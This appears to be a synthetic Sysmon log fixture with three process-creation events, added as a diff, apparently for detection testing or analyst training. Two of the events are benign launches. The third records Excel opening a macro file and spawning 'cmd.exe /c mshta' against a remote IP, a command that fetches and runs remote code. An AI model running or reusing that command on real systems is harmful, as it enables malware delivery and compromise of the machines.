@@ -1,0 +1,129 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-20T08:10:05.123" />
+    <EventRecordID>990101</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="2456" ThreadID="3120" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WS-FIN-11.corp.local</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-04-20 08:10:05.000</Data>
+    <Data Name="ProcessGuid">{a1b2c3d4-1100-6624-0000-0010aabbccdd}</Data>
+    <Data Name="ProcessId">4120</Data>
+    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
+    <Data Name="FileVersion">10.0.19041.1</Data>
+    <Data Name="Description">-</Data>
+    <Data Name="Product">-</Data>
+    <Data Name="Company">-</Data>
+    <Data Name="OriginalFileName">-</Data>
+    <Data Name="CommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe"</Data>
+    <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+    <Data Name="User">CORP\admin</Data>
+    <Data Name="LogonGuid">{a1b2c3d4-0f00-6624-0000-0020aabbccdd}</Data>
+    <Data Name="LogonId">0x4f8a2</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA256=0A9C1B2E3F4D5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B</Data>
+    <Data Name="ParentProcessGuid">{a1b2c3d4-1000-6624-0000-0030aabbccdd}</Data>
+    <Data Name="ParentProcessId">3200</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
+    <Data Name="ParentUser">CORP\admin</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-20T08:10:09.123" />
+    <EventRecordID>990102</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="2456" ThreadID="3120" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WS-FIN-11.corp.local</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-04-20 08:10:09.000</Data>
+    <Data Name="ProcessGuid">{a1b2c3d4-1100-6624-0000-0010aabbccdd}</Data>
+    <Data Name="ProcessId">5210</Data>
+    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="FileVersion">10.0.19041.1</Data>
+    <Data Name="Description">-</Data>
+    <Data Name="Product">-</Data>
+    <Data Name="Company">-</Data>
+    <Data Name="OriginalFileName">-</Data>
+    <Data Name="CommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
+    <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+    <Data Name="LogonGuid">{a1b2c3d4-0f00-6624-0000-0020aabbccdd}</Data>
+    <Data Name="LogonId">0x4f8a2</Data>
+    <Data Name="TerminalSessionId">0</Data>
+    <Data Name="IntegrityLevel">System</Data>
+    <Data Name="Hashes">SHA256=1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C</Data>
+    <Data Name="ParentProcessGuid">{a1b2c3d4-1000-6624-0000-0030aabbccdd}</Data>
+    <Data Name="ParentProcessId">712</Data>
+    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+    <Data Name="ParentCommandLine">C:\Windows\system32\services.exe</Data>
+    <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-04-20T08:14:33.456" />
+    <EventRecordID>990103</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="2456" ThreadID="3120" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WS-FIN-11.corp.local</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-04-20 08:14:33.000</Data>
+    <Data Name="ProcessGuid">{a1b2c3d4-1100-6624-0000-0010aabbccdd}</Data>
+    <Data Name="ProcessId">7180</Data>
+    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="FileVersion">10.0.19041.1</Data>
+    <Data Name="Description">-</Data>
+    <Data Name="Product">-</Data>
+    <Data Name="Company">-</Data>
+    <Data Name="OriginalFileName">-</Data>
+    <Data Name="CommandLine">cmd.exe /c mshta http://45.86.230.12/update.hta</Data>
+    <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+    <Data Name="User">CORP\mbrown</Data>
+    <Data Name="LogonGuid">{a1b2c3d4-0f00-6624-0000-0020aabbccdd}</Data>
+    <Data Name="LogonId">0x4f8a2</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA256=D5B0A3F2C8E4179026B5C2DAF9E8071452B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7</Data>
+    <Data Name="ParentProcessGuid">{a1b2c3d4-1000-6624-0000-0030aabbccdd}</Data>
+    <Data Name="ParentProcessId">6010</Data>
+    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE</Data>
+    <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "C:\Users\mbrown\Downloads\Budget_Q2.xlsm"</Data>
+    <Data Name="ParentUser">CORP\mbrown</Data>
+  </EventData>
+</Event>
